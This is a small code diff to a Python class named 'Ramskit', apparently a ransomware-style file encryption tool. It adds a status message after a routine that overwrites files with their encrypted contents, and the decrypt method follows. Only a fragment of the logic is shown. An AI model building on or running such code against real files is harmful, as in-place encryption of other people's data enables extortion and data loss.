@@ -45,6 +45,8 @@ class Ramskit:
             with open(item, 'wb') as file:
                 file.write(encrypted)
 
+            print(f"[+] File encrypted successfully: {item}")
+
     def decrypt_file(self, items, key) -> None:
         for item in items:
             with open(item, 'rb') as file:
